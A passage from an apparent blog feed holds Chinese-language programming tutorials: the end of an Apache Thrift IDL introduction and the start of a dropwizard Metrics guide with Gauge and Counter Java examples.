&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; People &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;: required &lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt; name;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;: optional i32 age;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;表示name是必填的，age是可选的。&lt;/p&gt;
&lt;h3 id=&quot;联合-union&quot;&gt;&lt;a href=&quot;#联合-union&quot; class=&quot;headerlink&quot; title=&quot;联合(union)&quot;&gt;&lt;/a&gt;联合(union)&lt;/h3&gt;&lt;p&gt;当一个结构体中，field之间的关系是互斥的，即只能有一个field被使用被赋值。我们可以用union来声明这个结构体，而不是一堆堆optional的field，语意上也更明确了。例如：&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;union&lt;/span&gt; JavaObjectArg &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;: i32 int_arg;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;: i64 long_arg;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;: &lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt; string_arg;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;: &lt;span class=&quot;keyword&quot;&gt;bool&lt;/span&gt; bool_arg;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;: binary binary_arg;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;: &lt;span class=&quot;keyword&quot;&gt;double&lt;/span&gt; double_arg;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;异常-Exceptions&quot;&gt;&lt;a href=&quot;#异常-Exceptions&quot; class=&quot;headerlink&quot; title=&quot;异常(Exceptions)&quot;&gt;&lt;/a&gt;异常(Exceptions)&lt;/h3&gt;&lt;p&gt;可以自定义异常类型，所定义的异常会继承对应语言的异常基类，例如java，就会继承 &lt;code&gt;java.lang.Exception&lt;/code&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;exception InvalidOperation &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;: i32 what,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;: &lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt; why&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;服务-service&quot;&gt;&lt;a href=&quot;#服务-service&quot; class=&quot;headerlink&quot; title=&quot;服务(service)&quot;&gt;&lt;/a&gt;服务(service)&lt;/h3&gt;&lt;p&gt;thrift定义服务相当于Java中创建Interface一样，创建的service经过代码生成命令之后就会生成客户端和服务端的框架代码。定义形式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;service StringCache &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  void set(1:i32 key, 2:string value),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  string get(1:i32 key) throws (1:KeyNotFound knf),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  void delete(1:i32 key)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;命名空间-namespace&quot;&gt;&lt;a href=&quot;#命名空间-namespace&quot; class=&quot;headerlink&quot; title=&quot;命名空间(namespace)&quot;&gt;&lt;/a&gt;命名空间(namespace)&lt;/h3&gt;&lt;p&gt;thrift的命名空间相当于Java中的package的意思，主要目的是组织代码。thrift使用关键字namespace定义命名空间，例如：&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;namespace&lt;/span&gt; java me.wuchong.thrift&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意末尾不能有分号，由此生成的代码，其包路径结构为&lt;code&gt;me.wuchong.thrift&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/blog/2015/10/07/thrift-practice&quot;&gt;下一篇文章&lt;/a&gt;，将通过一个简单的实例来了解thrift的使用。&lt;/p&gt;
&lt;p&gt;##参考资料&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://diwakergupta.github.io/thrift-missing-guide/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Thrift: The Missing Guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://thrift-tutorial.readthedocs.org/en/latest/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Thrift Tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.jianshu.com/p/0f4113d6ec4b&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;thrift入门教程&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;Thrift 最初由Facebook开发，而后捐献给Apache，目前已广泛应用于业界。Thrift 正如其&lt;a href=&quot;https://thrift.apache.org/&quot;&gt;官方主页&lt;/a&gt;介绍的，“是一种可扩展、跨语言的服务开发框架”。简而言之，它主要用于各个服务之间的RPC通信，其服务端和客户端可以用不同的语言来开发。只需要依照IDL（Interface Description Language）定义一次接口，Thrift工具就能自动生成 C++, Java, Python, PHP, Ruby, Erlang, Perl, Haskell, C#, Cocoa, JavaScript, Node.js, Smalltalk, and OCaml等语言的代码。&lt;/p&gt;
    
    </summary>
    
      <category term="程序设计" scheme="http://wuchong.me/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
      <category term="教程" scheme="http://wuchong.me/tags/%E6%95%99%E7%A8%8B/"/>
    
      <category term="thrift" scheme="http://wuchong.me/tags/thrift/"/>
    
  </entry>
  
  <entry>
    <title>Metrics 是个什么鬼 之入门教程</title>
    <link href="http://wuchong.me/blog/2015/08/01/getting-started-with-metrics/"/>
    <id>http://wuchong.me/blog/2015/08/01/getting-started-with-metrics/</id>
    <published>2015-08-01T08:51:52.000Z</published>
    <updated>2016-03-08T12:10:06.000Z</updated>
    
    <content type="html">&lt;p&gt;Metrics，谷歌翻译就是度量的意思。当我们需要为某个系统某个服务做监控、做统计，就需要用到Metrics。&lt;/p&gt;
&lt;p&gt;举个栗子，一个图片压缩服务：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;每秒钟的请求数是多少（TPS）？&lt;/li&gt;
&lt;li&gt;平均每个请求处理的时间？&lt;/li&gt;
&lt;li&gt;请求处理的最长耗时？&lt;/li&gt;
&lt;li&gt;等待处理的请求队列长度？&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;又或者一个缓存服务：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;缓存的命中率？&lt;/li&gt;
&lt;li&gt;平均查询缓存的时间？&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;基本上每一个服务、应用都需要做一个监控系统，这需要尽量以少量的代码，实现统计某类数据的功能。&lt;/p&gt;
&lt;p&gt;以 Java 为例，目前最为流行的 metrics 库是来自 Coda Hale 的 &lt;a href=&quot;https://github.com/dropwizard/metrics&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;dropwizard/metrics&lt;/a&gt;，该库被广泛地应用于各个知名的开源项目中。例如 Hadoop，Kafka，Spark，JStorm 中。 &lt;/p&gt;
&lt;p&gt;本文就结合范例来主要介绍下 dropwizard/metrics 的概念和用法。&lt;/p&gt;
&lt;h2 id=&quot;Maven-配置&quot;&gt;&lt;a href=&quot;#Maven-配置&quot; class=&quot;headerlink&quot; title=&quot;Maven 配置&quot;&gt;&lt;/a&gt;Maven 配置&lt;/h2&gt;&lt;p&gt;我们需要在&lt;code&gt;pom.xml&lt;/code&gt;中依赖 &lt;code&gt;metrics-core&lt;/code&gt; 包：&lt;br&gt;&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependencies&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;io.dropwizard.metrics&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;metrics-core&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;$&amp;#123;metrics.version&amp;#125;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependencies&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;注：在POM文件中需要声明 &lt;code&gt;${metrics.version}&lt;/code&gt; 的具体版本号，如 3.1.0&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&quot;Metric-Registries&quot;&gt;&lt;a href=&quot;#Metric-Registries&quot; class=&quot;headerlink&quot; title=&quot;Metric Registries&quot;&gt;&lt;/a&gt;Metric Registries&lt;/h2&gt;&lt;p&gt;&lt;code&gt;MetricRegistry&lt;/code&gt;类是Metrics的核心，它是存放应用中所有metrics的容器。也是我们使用 Metrics 库的起点。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;MetricRegistry registry = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; MetricRegistry();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;每一个 metric 都有它独一无二的名字，Metrics 中使用句点名字，如 com.example.Queue.size。当你在 com.example.Queue 下有两个 metric 实例，可以指定地更具体：com.example.Queue.requests.size 和 com.example.Queue.response.size 。使用&lt;code&gt;MetricRegistry&lt;/code&gt;类，可以非常方便地生成名字。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;MetricRegistry.name(Queue.class, &lt;span class=&quot;string&quot;&gt;&quot;requests&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;size&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MetricRegistry.name(Queue.class, &lt;span class=&quot;string&quot;&gt;&quot;responses&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;size&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Metrics-数据展示&quot;&gt;&lt;a href=&quot;#Metrics-数据展示&quot; class=&quot;headerlink&quot; title=&quot;Metrics 数据展示&quot;&gt;&lt;/a&gt;Metrics 数据展示&lt;/h2&gt;&lt;p&gt;Metircs 提供了 Report 接口，用于展示 metrics 获取到的统计数据。&lt;code&gt;metrics-core&lt;/code&gt;中主要实现了四种 reporter： &lt;a href=&quot;http://metrics.dropwizard.io/3.1.0/manual/core/#man-core-reporters-jmx&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;JMX&lt;/a&gt;, &lt;a href=&quot;http://metrics.dropwizard.io/3.1.0/manual/core/#man-core-reporters-console&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;console&lt;/a&gt;, &lt;a href=&quot;http://metrics.dropwizard.io/3.1.0/manual/core/#man-core-reporters-slf4j&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SLF4J&lt;/a&gt;, 和 &lt;a href=&quot;http://metrics.dropwizard.io/3.1.0/manual/core/#man-core-reporters-csv&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CSV&lt;/a&gt;。 在本文的例子中，我们使用 ConsoleReporter 。&lt;/p&gt;
&lt;h2 id=&quot;五种-Metrics-类型&quot;&gt;&lt;a href=&quot;#五种-Metrics-类型&quot; class=&quot;headerlink&quot; title=&quot;五种 Metrics 类型&quot;&gt;&lt;/a&gt;五种 Metrics 类型&lt;/h2&gt;&lt;h3 id=&quot;Gauges&quot;&gt;&lt;a href=&quot;#Gauges&quot; class=&quot;headerlink&quot; title=&quot;Gauges&quot;&gt;&lt;/a&gt;Gauges&lt;/h3&gt;&lt;p&gt;最简单的度量指标，只有一个简单的返回值，例如，我们想衡量一个待处理队列中任务的个数，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;GaugeTest&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Queue&amp;lt;String&amp;gt; q = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; LinkedList&amp;lt;String&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String[] args)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; InterruptedException &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        MetricRegistry registry = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; MetricRegistry();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        reporter.start(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, TimeUnit.SECONDS);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        registry.register(MetricRegistry.name(GaugeTest.class, &lt;span class=&quot;string&quot;&gt;&quot;queue&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;size&quot;&lt;/span&gt;), &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Gauge&amp;lt;Integer&amp;gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; Integer &lt;span class=&quot;title&quot;&gt;getValue&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; q.size();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Thread.sleep(&lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            q.add(&lt;span class=&quot;string&quot;&gt;&quot;Job-xxx&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;运行之后的结果如下：&lt;br&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-- Gauges ------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;com&lt;span class=&quot;selector-class&quot;&gt;.alibaba&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.wuchong&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.metrics&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.GaugeTest&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.queue&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.size&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;             value = &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其中第7行和第8行添加了ConsoleReporter，可以每秒钟将度量指标打印在屏幕上，理解起来会更清楚。&lt;/p&gt;
&lt;p&gt;但是对于大多数队列数据结构，我们并不想简单地返回&lt;code&gt;queue.size()&lt;/code&gt;，因为&lt;code&gt;java.util&lt;/code&gt;和&lt;code&gt;java.util.concurrent&lt;/code&gt;中实现的&lt;code&gt;#size()&lt;/code&gt;方法很多都是 &lt;strong&gt;O(n)&lt;/strong&gt; 的复杂度，这会影响 Gauge 的性能。&lt;/p&gt;
&lt;h3 id=&quot;Counters&quot;&gt;&lt;a href=&quot;#Counters&quot; class=&quot;headerlink&quot; title=&quot;Counters&quot;&gt;&lt;/a&gt;Counters&lt;/h3&gt;&lt;p&gt;Counter 就是计数器，Counter 只是用 Gauge 封装了 &lt;code&gt;AtomicLong&lt;/code&gt; 。我们可以使用如下的方法，使得获得队列大小更加高效。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;CounterTest&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Queue&amp;lt;String&amp;gt; q = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; LinkedBlockingQueue&amp;lt;String&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Counter pendingJobs;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Random random = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Random();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;addJob&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String job)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        pendingJobs.inc();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        q.offer(job);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; String &lt;span class=&quot;title&quot;&gt;takeJob&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        pendingJobs.dec();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; q.poll();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String[] args)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; InterruptedException &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        MetricRegistry registry = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; MetricRegistry();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        reporter.start(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, TimeUnit.SECONDS);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        pendingJobs = registry.counter(MetricRegistry.name(Queue.class,&lt;span class=&quot;string&quot;&gt;&quot;pending-jobs&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;size&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; num = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Thread.sleep(&lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (random.nextDouble() &amp;gt; &lt;span class=&quot;number&quot;&gt;0.7&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                String job = takeJob();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                System.out.println(&lt;span class=&quot;string&quot;&gt;&quot;take job : &quot;&lt;/span&gt;+job);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                String job = &lt;span class=&quot;string&quot;&gt;&quot;Job-&quot;&lt;/span&gt;+num;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                